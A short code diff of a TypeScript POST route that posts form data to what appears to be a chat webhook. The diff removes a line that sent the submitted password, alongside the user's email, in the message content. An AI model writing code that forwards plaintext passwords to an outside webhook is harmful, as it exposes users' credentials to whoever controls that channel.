@@ -22,11 +22,11 @@ export async function POST(req: Request) {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                content: password,
+                
                 username: email,
                 embeds: [
                     {
-                        title: 'New message from ' + email,
+                        title: 'New message from ' + firstname+" "+lastname,
                         color: 3447003,
                         fields: [
                             {
